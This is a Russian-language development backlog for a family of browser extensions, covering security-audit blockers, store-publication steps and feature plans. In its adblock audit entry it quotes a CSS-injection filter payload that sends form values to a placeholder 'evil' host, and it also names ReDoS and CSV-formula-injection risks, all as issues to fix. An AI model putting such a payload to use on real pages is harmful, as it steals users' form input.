# TODO — единый бэклог

> Актуально на **2026-07-14**. Единственный документ, куда смотрят, когда спрашивают «что дальше».
>
> - [`PLAN.md`](./PLAN.md) — research + архитектура первых **четырёх** расширений (blur, adblock, perf, seo). Код готов, версия 1.0.0.
> - [`PLAN-2.md`](./PLAN-2.md) — research + архитектура **шести новых** (capture, devdata, export, assets, whoami, compose). Не начаты.
> - [`STORE.md`](./STORE.md) — чеклист публикации и тексты листингов.
> - [`docs/design/`](./docs/design/) — полные UX/UI-макеты шести новых расширений (по файлу на каждое).
> - [`docs/audit/`](./docs/audit/) — аудит существующих четырёх от 2026-07-14 (безопасность, отказоустойчивость, готовность к стору).
>
> Правило: пункт живёт здесь, детали и обоснования — в PLAN-документах, дизайне и аудитах. Не дублировать.

---

## 🔴 0. Блокеры из аудита 2026-07-14 (существующие четыре)

Аудит четырёх готовых расширений (по агенту на каждое). Полные отчёты с `file:line` — в [`docs/audit/`](./docs/audit/). Итог: **seo чист (блокеров нет)**, у остальных трёх — по 2–4 блокера. **Это правит регрессию «код готов, 57/57»: к сабмиту без этих правок нельзя.**

### blur — [`docs/audit/2026-07-14-blur.md`](./docs/audit/2026-07-14-blur.md)
- [ ] 🔴 **Состояние расширения лежит в `localStorage` страницы** (`content.ts:94,112,143,240,474`). Любой сайт читает настройки и факт установки, и — хуже — может записать `{"active":false}` и **отключить block-first маску до первой отрисовки** (главный инвариант продукта). Фикс: префейнт-CSS через `scripting.registerContentScripts({css, runAt:'document_start'})` из background.
- [ ] 🔴 **`scripting` объявлен, но не используется** (`wxt.config.ts:60`, 0 вызовов), а `STORE.md:182`/`README.md:46` дают под него ложное обоснование → Purple Potassium (избыточное разрешение). Удалить или задействовать в фиксе выше.
- [ ] 🔴 **`README.md:48`** рекламирует `optional_host_permissions: <all_urls>`, которого нет в манифесте, — формулировка, прямо запрещённая `STORE.md:26-32`.
- [ ] 🔴 **Тумблер сайта не subdomain-aware** (`popup/App.tsx:319-325`): на `www.example.com` при allowlist `example.com` блюр не включить, в список сыплется мусор.
- [ ] ⚠️ Импорт бэкапа не валидирует `textPatterns` → ReDoS вешает вкладку; `\n` в `imageSourceRules` роняет весь селектор → **fail-open, блюр молча исчезает**; iframes не блюрятся (нет `all_frames`); RMW-гонка на `siteConfigs`/`prefs`; «Counts are EXACT» — неправда при min-size gate.

### adblock — [`docs/audit/2026-07-14-adblock.md`](./docs/audit/2026-07-14-adblock.md)
- [ ] 🔴 **CSS-инъекция через косметические селекторы** (`packages/core/src/stylesheet.ts:176-177`; входы `utils/custom-filters.ts:112-128`, `:169-187`, `utils/backup-parse.ts:123-134`). Импортированное правило `##x}input[value^=a]{background:url(//evil)}b` → эксфильтрация значений форм с каждой страницы. Фикс: реджектить селекторы с `{}@<` и/или прогонять через `document.querySelector` в try на всех трёх путях.
- [ ] 🔴 **Счётчик завышает** (`utils/matched-rules.ts:42-56`): статические `allow`/`allowAllRequests`/`modifyHeaders` считаются как «блокировки» (easylist = 3005 allow). Нарушает «не врать в UI». Фикс: разнести block/не-block по разным ruleset-id и считать только block-наборы.
- [ ] ⚠️ Инертные `modifyHeaders` без host-гранта; несериализованная реконсиляция DNR; произвольная truncation easylist до 28% AdGuard Base; замусоривание агрегата отчётом с `tabId=-1`.

### perf — [`docs/audit/2026-07-14-perf.md`](./docs/audit/2026-07-14-perf.md)
- [ ] 🔴 **В Google (PSI) уходит полный URL с query-string** (`psi.ts:204`, `AuditPanel.tsx:34-38,106`) — `?token=…`/PII эксфильтруются, а поле URL **read-only**, вычистить секрет нельзя. Фикс: сделать URL редактируемым + кнопка «только домен/путь» + предупредить про query-параметры.
- [ ] 🔴 **Гейт-раскрытие PSI неполное под политику 2026-08-01** (`AuditPanel.tsx:126-137`): одно предложение, нет data-retention, нет ссылки на политику, нет упоминания секретов в URL, **нет revoke** (`disclosureAccepted` пишется раз и не сбрасывается). Точная UI-копия — в отчёте. NB: само in-UI раскрытие **уже есть** (affirmative consent до первого вызова) — политика формально выполнена, чинить надо полноту.
- [ ] Прогнать `perf.spec.ts` headed — весь CDP-путь и оба блокера живут там, где e2e не гонялись.

### seo — [`docs/audit/2026-07-14-seo.md`](./docs/audit/2026-07-14-seo.md)
- [x] ~~Блокеры~~ **нет. Самое чистое из четырёх.** XSS-путь (контент страницы → привилегированный UI) проверен и чист (всё через React-текст); `web_accessible_resources`/`DANGEROUS_EVAL` — безобидны и честно раскрыты (axe-core под CSP страницы).
- [ ] ⚠️ Нет таймаута/лимита размера на fetch robots.txt/sitemap/HEAD (`indexability.ts:16-24,172,259,303`) → враждебный/битый сервер вешает SEO-скан навсегда без ошибки. Добавить AbortController + cap.
- [ ] ⚠️ `violation.helpUrl` из axe попадает в `<a href>` без allowlist схемы (`report-ui.tsx:112-119`); nonce не секретный (`content.ts:54-56`) — страница может подделать a11y-результат во время аудита.

---

## 🔴 A. Блокеры публикации существующих четырёх

Код готов и проверен вживую (e2e 57/57), но аудит §0 нашёл блокеры — сначала они. Ниже — то, что скриптом не сделать.

- [ ] **Скриншоты для листингов.** Chrome требует минимум 1 (1280×800 или 640×400), рекомендует 5. Нужен человек с настоящим браузером. По каждому из четырёх. — `STORE.md`
- [ ] **Человек должен посмотреть на сгенерированные иконки.** Их нарисовал скрипт (`scripts/gen-icons.mjs`), глазами их не видел никто.
- [ ] **Заменить placeholder gecko-id `@blur.example`** на реальный домен во всех Firefox-манифестах. Бизнес-решение.
- [ ] **Аккаунты разработчика**: Chrome Web Store (разовый взнос), AMO, Edge Add-ons, Opera.
- [ ] ⚠️ **`perf`: раскрытие PSI перенести в UI расширения.** С **1 августа 2026** CWS требует prominent disclosure **внутри UI**; «disclosures in the Chrome Web Store description do not satisfy this requirement». Сейчас раскрытие живёт в `PRIVACY.md` и листинге — этого больше недостаточно. — `PLAN-2.md` §8
- [ ] ⚠️ **Все четыре: проверить `data_collection_permissions`.** С 3 ноября 2025 AMO требует ключ у всех новых расширений. У нас он есть — перепроверить значения против [актуальной таксономии](https://extensionworkshop.com/documentation/develop/firefox-builtin-data-consent/).
- [ ] Промо-тайл 1400×560 (опционально, Chrome), промо-видео (опционально).

## B. Технический долг существующих четырёх

- [~] 🔴 **`packages/ui` — дедупликация дизайн-токенов.** ✅ Пакет **создан** (канонический набор токенов + тема + примитивы), шесть новых расширений уже на нём. ⬜ Остаётся **мигрировать существующие четыре** (blur+adblock и perf+seo сейчас с двумя расходящимися копиями токенов) на `@blur/ui` и удалить копии. — `PLAN.md` §18, `PLAN-2.md` §6, `packages/ui/README.md`
- [ ] **Safari — отдельная фаза.** Нужен macOS + Xcode + `safari-web-extension-converter` + Apple Developer Program ($99/год) + App Store-ревью на каждый апдейт. Непроизводимо на Windows.
- [ ] **DevTools-панели (`perf`, `seo`) прогнать headed-e2e** (`perf.spec.ts`, `seo.spec.ts`) на машине с headed-Chromium. Сейчас проверены только сборкой и своими e2e; live-скриншот панели вне DevTools невозможен.
- [ ] **`blur`: keyword-blur внутри Shadow DOM.** Осознанно отложен — корректная реализация затрагивает reveal/reblur-семантику в обеих стратегиях, полумеры сломают reveal.
- [ ] **`blur`: точность счётчиков** для min-size gate и link-hiding марджинально «щедрая» — у core-движка нет per-matched-element хука. Визуал корректен, цифра слегка завышена.

## C. Открытые вопросы по существующим (из `PLAN.md` §17)

- [ ] Точная версия Chrome для `topDomains`/`excludedTopDomains` (референс говорит 145+, на What's New не подтвердилось).
- [ ] Численные лимиты DNR в Firefox (MDN документирует имена констант, но не значения).
- [ ] **Лицензия Peter Lowe's list для коммерческого использования** — запросить разрешение или исключить. Блокер, если список попадёт в бандл.
- [ ] Поведение `text-shadow` в `::highlight()` в Firefox — тестировать вживую.
- [ ] `captureVisibleTab` на Firefox Android при DPR > 1 — [Bugzilla 1751961](https://bugzilla.mozilla.org/show_bug.cgi?id=1751961).

---

# Новая волна: шесть расширений

Полный research и обоснования — [`PLAN-2.md`](./PLAN-2.md). Ниже — только работа.

## 🔴 D. Развилки, которые надо решить ДО кода

- [x] ~~**Расширение 8 (Media Downloader): выпускать ли?**~~ **Решено 2026-07-14: назначение изменено.** Вместо загрузчика — **Asset Inspector** (`extensions/assets`): «показать, откуда взялся любой элемент страницы». Не скачивает — показывает URL, редиректы, породившие запросы, открывает в новой вкладке. Возвращается в CWS, риск минимальный, `webRequest` и `<all_urls>` не нужны. — `PLAN-2.md` §4
- [ ] **Порядок запуска.** Рекомендация: **6 → 10 → 7 → 8 → 9 → 5**. Devdata, compose, export и assets — дешёвые и с нулевым риском ревью; capture — самое дорогое.
- [ ] **UA-switcher (потенциальное №11)** — отдельный продукт или не делать? Внутрь расширения 9 он не помещается: ломает и single purpose, и zero-permission позиционирование. — `PLAN-2.md` §5.4

## E. Фаза 0 — фундамент + каркасы на моках

**Статус 2026-07-14: каркасы всех шести собраны на моках.** `npm install` + `wxt prepare` ✅, **typecheck 11/11 воркспейсов ✅**, `wxt build` Chrome+Firefox для всех шести ✅. Проверено: compose эмитит `side_panel` (Chrome) / `sidebar_action` (Firefox) корректно; capture держит `tabCapture`+`offscreen` только в Chrome (в Firefox оба отсутствуют); whoami — `permissions:["storage"]` + CSP `connect-src` пришпилен к трём хостам. Каждое расширение: полный UI/навигация/персистентность настроек/тема real, доменная логика — стабы (`todoLogic`, `grep TODO_LOGIC`), на моках виден `<MockBadge>`.

- [x] `packages/ui` — создан: канонические токены (`tokens.css`), тема (`useThemeController`/`seedTheme`/`ThemeToggle`), примитивы (`Spinner`/`EmptyState`/`Badge`/`Button`/`CopyButton`/`Callout`/`MockBadge`), mock-хелперы. ⚠️ Существующие четыре на него **ещё не мигрированы** (см. §B) — пока потребляют только шесть новых.
- [x] Скрипты в корневом `package.json`: `dev:*` для шести новых (build/zip/typecheck идут через `--workspaces`).
- [ ] `packages/formats` — чистые конвертеры JSON/YAML/XML/CSV/JWT, без браузерных API (как `@blur/core`). Пока каждое расширение стабит логику у себя; вынести общее при подключении реальной логики devdata.
- [ ] **Иконки для шести новых** — расширить `scripts/lib/draw.mjs` (`BRAND`) + `gen-icons.mjs`. Сейчас `public/icon/.gitkeep`; `wxt build` их терпит (иконки в бандл не попадают), но для сабмита обязательны.
- [ ] Обновить `README.md`: десять расширений, новая структура монорепо (`packages/ui`, шесть новых).
- [ ] Подключать реальную логику по каждому — см. F–L. Детали «что real / что мок» — в `extensions/<name>/IMPLEMENTATION.md`.

## F. Расширение 6 — Data Format Toolkit (`extensions/devdata`) — **начинать с него**

📐 UX/UI-макеты: [`docs/design/devdata.md`](./docs/design/devdata.md). Цель: «Смотреть и конвертировать структурированные данные». Ноль install-предупреждений.
- [ ] Реализовать по дизайну. Главная поверхность — полностраничная вкладка `tool.html` (popup — лаунчер, options → та же страница `#/settings`). ⚠️ Дизайн предлагает `scripting` держать в `optional_permissions`, а не в baseline — проверить на живой сборке (Chrome MV3 + Firefox MV2, где `activeTab` даёт executeScript без `scripting`).

- [ ] Каркас WXT + React. Разрешения: **только** `storage`, `contextMenus`, `activeTab`. Ни одно не даёт предупреждения.
- [ ] JSON: parse (обычный / JSON5 / JSONC), beautify, minify, дерево с collapse, поиск по пути.
- [ ] ⚠️ **Подсветка через CSS Custom Highlight API** — один плоский `<pre>` + `Range`, а не десятки тысяч `<span>` и не 200 КБ highlight.js. Токенизатор свой либо scanner из `jsonc-parser`. Ограничение: `font-weight` в `::highlight()` менять нельзя.
- [ ] ⚠️ **`JSON.parse` source access (ES2026)** — показывать исходное `12345678901234567890`, а не потерявшее точность. Киллер-фича, конкуренты этого не делают.
- [ ] Большие файлы: парсинг в **Web Worker** + виртуализация окна (~100 строк) + `content-visibility: auto`. Цель — 50 МБ без фриза.
- [ ] JWT: декод header/payload/signature, expiry, claims. ⚠️ Рамка — **«100% offline, токен не покидает браузер, ноль сети, ноль аналитики»**, прямо в UI. Библиотека `jose` 6.2.3 (MIT, WebCrypto) либо 20 строк `atob` + base64url.
- [ ] JWT-верификация: RS/ES/EdDSA по публичному ключу, вставленному пользователем. ⚠️ HS256-секрет — строго in-memory, **без persist в `storage`** (иначе вы храните `authenticationInfo`). ⚠️ Токен наружу не отправлять никогда.
- [ ] XML ↔ JSON: ⚠️ **нативный `DOMParser` + `XMLSerializer`, 0 КБ.** `fast-xml-parser` v5 тащит 6 транзитивных зависимостей — не брать.
- [ ] YAML (`yaml` 2.9.0, ISC, zero-deps) и CSV (`papaparse` 5.5.4, MIT).
- [ ] JSON Schema: ⚠️ **`@cfworker/json-schema`** (MIT, zero-eval). **AJV не работает под MV3 CSP** — `ajv.compile()` использует `new Function()`. Sandboxed page — обход, но ключ `sandbox` не поддерживается в Firefox.
- [ ] Опционально: `optional_host_permissions: <all_urls>` + `permissions.request()` по тумблеру «авто-форматирование JSON-страниц». ⚠️ Без этого автоформат невозможен: `activeTab` выдаётся только по жесту, `declarativeContent.RequestContentScript` — экспериментальный и WONTFIX в Firefox.
- [ ] ⚠️ Честно сообщить в UI, что на Firefox мешает **встроенный JSON viewer** (`devtools.jsonview.enabled`) и расширение не может отключить его программно.
- [ ] Единый UI (табы одного инструмента), единое название под одну цель. ⚠️ **Ничего сетевого** — ни шортенера, ни аналитики: именно на этом ломается single purpose.

## G. Расширение 7 — Page Content Exporter (`extensions/export`)

📐 UX/UI-макеты: [`docs/design/export.md`](./docs/design/export.md). Цель: «Сохранить контент страницы в файл». Почти ноль install-предупреждений.
- [ ] 🔴 **Дизайн нашёл дыру в PLAN-2 §3.3:** `<a download>` **игнорирует атрибут `download` для cross-origin URL** → «сохранить картинку с CDN» молча делает навигацию, а не скачивание. Решение из дизайна: same-origin → anchor; CORS → fetch→blob→anchor; иначе честный отказ + опция `permissions.request(['downloads'])`. Реализовать эту лестницу, не наивный `<a download>`.
- [ ] 🔴 **CSV-инъекция** — ячейка, начинающаяся с `= + - @`, исполняется формулой в Excel. Дефолт `csvFormulaGuard = escape` (префикс `'`), ⚠️ **кроме валидных чисел** (иначе `-5` → `'-5`). Плюс `.xlsx` структурно иммунен (формулы в `<f>`) → рекомендуемый дефолтный формат.

- [ ] Каркас. Разрешения: `contextMenus` + `activeTab` (+ опц. `scripting`). ⚠️ **`downloads` НЕ нужен**: Blob + `URL.createObjectURL` + `<a download>` прямо из content script — чистый веб-API, работает в обоих браузерах.
- [ ] Выделенный текст → `.txt` / `.md` (контекстное меню).
- [ ] HTML-таблица → `.csv`. ⚠️ Без библиотеки: Blob + экранирование кавычек + **BOM `﻿`**, иначе Excel ломает кириллицу.
- [ ] HTML-таблица → `.xlsx`: ⚠️ **`write-excel-file`** (MIT, активна, dep только `fflate`). **Не SheetJS** (ушёл с npm, только свой CDN — трение на ревью) и **не exceljs** (заброшен с окт. 2023).
- [ ] Картинки: скачать / скопировать URL / открыть прямой URL в новой вкладке (`tabs.create` — нулевой риск).
- [ ] Если позже понадобится `saveAs`-диалог → `downloads` (предупреждение «Manage your downloads»). ⚠️ Тогда: blob-URL создавать **не в SW** (там нет `URL.createObjectURL`) — нужен offscreen-документ с reason **`BLOBS`**; в Firefox event page имеет DOM, offscreen не нужен. Ревокать URL по `downloads.onChanged`.
- [ ] ⚠️ В листинге **не описывать это как способ скачать видео.** Ревью CWS ловит намерение по метаданным, а не только по коду.

## H. Расширение 9 — Connection & Device Info (`extensions/whoami`)

📐 UX/UI-макеты: [`docs/design/whoami.md`](./docs/design/whoami.md). Цель: «Показать мои соединение и устройство».
- [ ] По дизайну: **без background service worker вообще** (fetch в документе попапа, IP живёт в React-state и умирает с попапом → «IP не хранится» верно архитектурно). Модель поля — discriminated union `{value}|{unavailable, reason}`, рендерер физически не может напечатать `—`.
- [ ] ⚠️ **Дизайн нашёл риск в PLAN-2 §5.2:** ipinfo.io Lite требует токен, а токен в клиенте публичен. Решение: пользователь вводит свой токен + ipapi.co как keyless-фолбэк — но ⚠️ у ipapi.co free-tier возможно тоже non-commercial (та же оговорка, что забанила ip-api.com). **Проверить ToS ipapi.co**; если тоже non-commercial — ISP-фича без ключа невозможна, T0+T1 (device + Cloudflare) всё равно составляют цельный продукт.

- [ ] Каркас. **Device-часть — с `"permissions": []` и нулём сети.** Это главный аргумент в сторе.
- [ ] Локально: UA, языки, timezone/locale (`Intl`), экран + DPR, `hardwareConcurrency`, `maxTouchPoints`, `storage.estimate()`, cookies/GPC, `prefers-*`.
- [ ] ⚠️ **Graceful degradation, а не пустые поля**, для Chromium-only: `userAgentData.getHighEntropyValues()` (Firefox и Safari **не реализовали и не планируют**), `deviceMemory`, `navigator.connection`, `navigator.gpu` (⚠️ в Chrome `device`/`description` часто пустые). `WEBGL_debug_renderer_info` — с фолбэком, в Firefox отключается при `privacy.resistFingerprinting`.
- [ ] IP + страна: **Cloudflare `one.one.one.one/cdn-cgi/trace`** (без ключа, HTTPS, `ACAO: *` — проверено). ⚠️ Даёт `ip`, `loc`, `colo`, `tls` — **но ни ISP, ни ASN, ни города**.
- [ ] ISP/ASN: **ipinfo.io**, ⚠️ **строго opt-in по клику**, `optional_host_permissions` на **конкретный домен** (`https://ipinfo.io/*`), а не `<all_urls>`. ⚠️ `<all_urls>` в этой категории — почти гарантированный отказ.
- [ ] 🔴 **`ip-api.com` не использовать**: на free нет HTTPS (под MV3 CSP физически не заработает) + прямой запрет коммерческого использования.
- [ ] ⚠️ **Prominent disclosure внутри UI** до первого сетевого запроса (не в описании стора). Privacy policy с указанием ipinfo.io как получателя. Firefox: `required: ["none"]` + `locationInfo` через optional-флоу → установка без data-warning.
- [ ] 🔴 **Красная линия: не вычислять, не хранить и не передавать стабильный fingerprint-хеш.** Всё считается в рантайме, ничего не персистится, ноль аналитики.
- [ ] ⚠️ WebRTC local-IP получить **нельзя** (mDNS-обфускация). Не пытаться и не обещать в листинге.

## I. Расширение 5 — Capture Studio (`extensions/capture`) — самое дорогое

📐 UX/UI-макеты: [`docs/design/capture.md`](./docs/design/capture.md). Цель: «Записать вкладку и экспортировать медиа».
- [ ] **Где живут контролы записи (главная проблема, решена в дизайне):** без `<all_urls>` оверлей на странице невозможен — и не только по политике: `tabCapture` пишет композит вкладки, поэтому инжектированная кнопка Stop **запечётся в видео**. Три канала: badge (только состояние), глобальный `commands`-шорткат (основной Stop), окно `recorder.html` (`windows.create`) с таймером в `document.title` (виден в таскбаре).
- [ ] ⚠️ **Дизайн переставил приоритеты из PLAN-2 §10.4 (обосновано):** микрофон, обрезка (trim) и редактирование секретов подняты в **v1** — иначе Firefox-сборка пишет молча (звука вкладки там нет), а без trim рушится killer-фича целевого размера, и пароли на скриншотах (v1) нечем закрыть.

- [ ] ⚠️ **Два пайплайна захвата, не один.**
  - Chrome: клик → SW → `tabCapture.getMediaStreamId()` (Chrome 116+) → `chrome.offscreen` (reason `USER_MEDIA`) → `getUserMedia` → `MediaRecorder`. streamId **протухает за секунды**.
  - Firefox: ⚠️ `tabCapture` **не существует**, `offscreen` **не существует**. Запись — `getDisplayMedia()` со **страницы расширения** (не popup — он закрывается и убивает поток).
- [ ] ⚠️ **Firefox: записи звука вкладки НЕ БУДЕТ** (`getDisplayMedia` `audio: false`). Только микрофон. Честно объявить в листинге.
- [ ] Скриншоты: `tabs.captureVisibleTab` (⚠️ лимит 2/сек, ⚠️ DPR-скейлинг — см. `PLAN.md` §6.2, там это уже разобрано).
- [ ] Кодирование: ⚠️ **WebCodecs + [mediabunny](https://github.com/Vanilagy/mediabunny)** (v1.50.8, MPL-2.0, активна). **`mp4-muxer`/`webm-muxer` — DEPRECATED** самим автором.
- [ ] Chrome 126+ пишет **MP4 прямо из MediaRecorder** → в Chrome транскодирование не нужно вовсе. ⚠️ Firefox MP4 не пишет → там конвертация **обязательна**.
- [ ] ⚠️ **Рантайм-проб `VideoEncoder.isConfigSupported({codec: 'avc1.42001f'})` на Firefox 130+.** Открытый вопрос: поддержан ли H.264-энкод. От ответа зависит, придётся ли тащить ffmpeg.wasm ради Firefox.
- [ ] Целевой размер файла: итеративный «ручной 2-pass» (`newBps = bps × target / actual`). ⚠️ Готовой опции нет ни у кого. ⚠️ `MediaRecorder.videoBitsPerSecond` — только пожелание → таргетировать **на пост-конверсии, не на записи**.
- [ ] Watermark: `OffscreenCanvas` + `fillText`. ⚠️ Логотип грузить из пакета (`runtime.getURL`) — внешний URL без CORS сделает канвас tainted и `convertToBlob()` упадёт. ⚠️ Каждый `VideoFrame` обязан быть `close()`-нут, дропать кадр при `encodeQueueSize > 2`.
- [ ] ⚠️ Live-оверлей: `MediaStreamTrackProcessor` **в Firefox отсутствует** → кросс-браузерно только `canvas.captureStream()` (дороже по CPU) либо оверлей пост-фактум.
- [ ] Длинные записи — чанками в IndexedDB, не массивом Blob в RAM.
- [ ] Если ffmpeg.wasm всё-таки понадобится: ⚠️ **бандлить локально** (`coreURL`/`wasmURL` через `runtime.getURL`) — дефолтный `load()` тянет ядро с unpkg = **remote code = мгновенный reject**. CSP `'wasm-unsafe-eval'`. ⚠️ Лимит входа **2 ГБ**. ⚠️ AMO потребует исходники WASM и воспроизводимую сборку. ⚠️ Проверить лицензию ядра (LGPL vs GPL с x264).
- [ ] Разрешения (уже, чем у Screenity): `tabCapture`, `offscreen`, `storage`, `unlimitedStorage`, `downloads`, `activeTab`; `desktopCapture` — в `optional_permissions`. **Без `<all_urls>`** — не делать оверлей-контролов на самой странице.
- [ ] Privacy policy — ⚠️ **обязателен, даже если всё локально.**
- [ ] 🔴 **Мобильных нет вообще.** Не обещать.

## J. Расширение 8 — Asset Inspector (`extensions/assets`)

📐 UX/UI-макеты: [`docs/design/assets.md`](./docs/design/assets.md). Цель: «Найти источник любого элемента на странице и запросы, которые его загрузили». **Инспектор, не загрузчик.**
- [ ] По дизайну: главная поверхность — **карточка ресурса в closed shadow-root на странице**, не попап (попап умирает на первом клике по странице). Превью — `canvas.drawImage(существующий элемент)`, **ноль сети** → инвариант «не загрузчик» верен в коде. Даже экспорт карточки — «Copy as JSON», файл не пишется никогда.
- [ ] ✅ Две фактические ошибки PLAN-2, найденные дизайном, уже поправлены в плане: буфер RT теряет **поздние** запросы (не ранние), и назвать «Widevine» нельзя (карточка показывает «EME активен»).

- [ ] Каркас. Разрешения: `activeTab`, `scripting`, `storage`, `contextMenus`, `devtools_page` — **ни одно не даёт install-предупреждения**.
- [ ] Element picker (инъекция по клику на иконку). ⚠️ Picker уже написан в `adblock` — **переиспользовать, а не писать заново**.
- [ ] Карточка ресурса: финальный URL (полный, копируемый, «открыть в новой вкладке»), тип, MIME, формат/кодек, натуральный размер vs отображаемый.
- [ ] **Какой кандидат `srcset` выбрал браузер и почему** (`currentSrc` vs `srcset` + `sizes` + DPR). Узнать это иначе почти невозможно — сильный дифференциатор.
- [ ] Перевес: «картинка 2000px показана в 100px».
- [ ] Запросы, породившие ресурс: `performance.getEntriesByType('resource')`. ⚠️ Вне DevTools **инициатор недоступен** — показывать только `initiatorType` и честно об этом писать. ⚠️ Буфер ~250 записей → `setResourceTimingBufferSize()` + предупреждение, что запросы **до** открытия инспектора могли не попасть.
- [ ] Цепочка редиректов + полный инициатор → **DevTools-панель** (`chrome.devtools.network.onRequestFinished`, HAR `_initiator` / `redirectURL`).
- [ ] ⚠️ Вес ресурса: `transferSize` = **0 для cross-origin без TAO** (`PLAN.md` §8) → помечать «не измерен», **не показывать ноль**.
- [ ] **Честная карточка для MSE/DRM**: «прямого URL не существует, плеер собирает видео из сегментов; вот запросы, которые его тянут; DRM: Widevine». Объяснение, а не обход — превращает главное ограничение в фичу.
- [ ] 🔴 **Инварианты, на которых держится вся конструкция** (нарушить один — продукт меняет категорию и уезжает в бан):
  - Нет кнопки «Скачать». Нет разрешения `downloads`. Нет `fetch()` медиа кодом расширения.
  - Нет парсинга `.m3u8`/`.mpd` и склейки сегментов (показать манифест как ресурс — можно, разбирать — нет).
  - Нет `webRequest`, нет `<all_urls>`, нет `chrome.debugger` (последний занят `perf`, плюс жёлтый баннер).
  - В листинге ни разу нет слов «download / downloader / save video / ripper», нет логотипов стримингов на скриншотах.
- [ ] ⚠️ **Разграничить с `perf`** и соблюдать границу в коде: `perf` = «насколько быстро и тяжело грузится **страница**» (waterfall, байты, CWV), `assets` = «что это за **элемент** и откуда он взялся». Если `assets` начнёт рисовать waterfall — продукты надо сливать, а не плодить. — `PLAN-2.md` §4.3
- [ ] 🔜 v2: диагностика «почему не загрузилось» (404 / CORS / mixed content / CSP), резолвинг реально применённого `@font-face` файла, lazy-load аудит (`loading`/`decoding`/`fetchpriority`), дубли ресурсов, таблица всех ресурсов с фильтром, экспорт **метаданных** (не медиа).

## L. Расширение 10 — Markdown Workbench (`extensions/compose`)

📐 UX/UI-макеты: [`docs/design/compose.md`](./docs/design/compose.md). Цель: «Написать и отформатировать текст перед вставкой». Ноль сети, ноль install-предупреждений.
- [ ] По дизайну: единый источник истины — markdown-черновик, **конвертация только на выходе** (смена площадки лосслесс, деградация конструкций показывается в `<dialog>` до копирования). Санитайзер как физическая граница: `markdown-it(html:true)` → DOMPurify `RETURN_DOM_FRAGMENT` → `replaceChildren`, превью в closed Shadow DOM, `innerHTML`/`dangerouslySetInnerHTML` запрещены ESLint'ом. Транслитерация — **свои таблицы** (5 стандартов), не npm-пакет.

- [ ] Каркас. Разрешения: `storage`, `contextMenus`, `clipboardWrite`, `activeTab`. Точка входа — **side panel** (пишешь баг-репорт, не теряя страницу из виду). ⚠️ В Firefox это `sidebar_action` — проверить, как WXT разводит их из одного entrypoint.
- [ ] 🔴 **Single purpose держится на одном правиле: ни у regex, ни у транслита, ни у счётчика НЕТ собственной точки входа.** Только табы одного редактора. Как только regex получает свою иконку — это «швейцарский нож», то есть bundle, то есть отказ. — `PLAN-2.md` §6.1
- [ ] Markdown-редактор + превью. 🔴 **Обязателен `DOMPurify`** с allow-list (`details`, `summary`, таблицы, `code`): превью вставляет HTML в страницу расширения с доступом к `chrome.*` — XSS здесь это компрометация расширения, а не дефейс. ⚠️ Проверить, дозрел ли нативный `Element.setHTML()`.
- [ ] Панель вставки: жирный, чекбоксы `- [ ]`, `<details><summary>`, таблицы, код, ссылки, цитаты.
- [ ] Эмодзи-пикер: отдавать **и** Unicode, **и** шорткод `:tada:`. ⚠️ Данные грузить лениво (`await import()`).
- [ ] 🆕 **Переключатель целевой площадки + конвертация на выходе** — главный дифференциатор. GitHub/GitLab ≠ Jira (свой wiki-markup) ≠ Slack (mrkdwn) ≠ Telegram (MarkdownV2). ⚠️ Превью обещать «близко к GitHub», а не «идентично».
- [ ] «Копировать как HTML»: `ClipboardItem` с `text/html` **и** `text/plain` разом → в Google Docs летит форматирование, в текстовое поле — чистый Markdown.
- [ ] Шаблоны баг-репорта + кнопка «вставить окружение» (браузер/ОС/экран из `navigator`).
- [ ] Счётчик: ⚠️ **`str.length` даёт неверный ответ** (`"👍".length === 2`, `"🇺🇦".length === 4`). Считать через **`Intl.Segmenter`** с `granularity: 'grapheme'`. Показывать несколько чисел: графемы / UTF-16 / **байты UTF-8** (`TextEncoder`) / слова / строки. Пресеты лимитов (X 280, meta description 160, commit 50/72).
- [ ] Regex find & replace: ⚠️ **только в Web Worker с таймаутом и `terminate()`** — `new RegExp(userInput)` с катастрофическим бэктрекингом вешает главный поток намертво. Подсветка — Custom Highlight API (как в `devdata`).
- [ ] Транслитерация: ⚠️ **не одна функция, а пять стандартов** с разным результатом (ICAO/паспорт, BGN/PCGN, ISO 9, ГОСТ 7.79-Б, slug). Выбор обязателен, дефолт — паспортный, отдельная кнопка «slug» (ветки GitLab, якоря, имена файлов).
- [ ] Черновики: ⚠️ **`storage.local`, не `sync`** — квота sync 8 192 байта на элемент, длинный баг-репорт порвёт её с тихой потерей данных (уже наступали в `blur`).
- [ ] 🔴 **Не класть сюда:** AI «улучшить текст», облачную синхронизацию черновиков (сеть + сбор данных + другая цель), конвертацию **страницы** в Markdown (это `export`).
- [ ] 🔜 v2: латиница→кириллица и исправление раскладки (`ghbdtn` → `привет`), украинский/белорусский транслит, Mermaid (лениво), оглавление, выравнивание таблиц.

## K. Публикация новой волны

- [ ] По каждому: аудит разрешений, privacy policy, `wxt zip` + sources ZIP для AMO/Opera, скриншоты, обоснование каждого разрешения в дашборде.
- [ ] ⚠️ Проверить всё против **CWS-политики от 1 августа 2026**: сбор данных *strictly necessary* к single purpose + prominent disclosure **в UI**.
- [ ] ⚠️ `data_collection_permissions` в каждом Firefox-манифесте (обязательно с 3 ноября 2025).
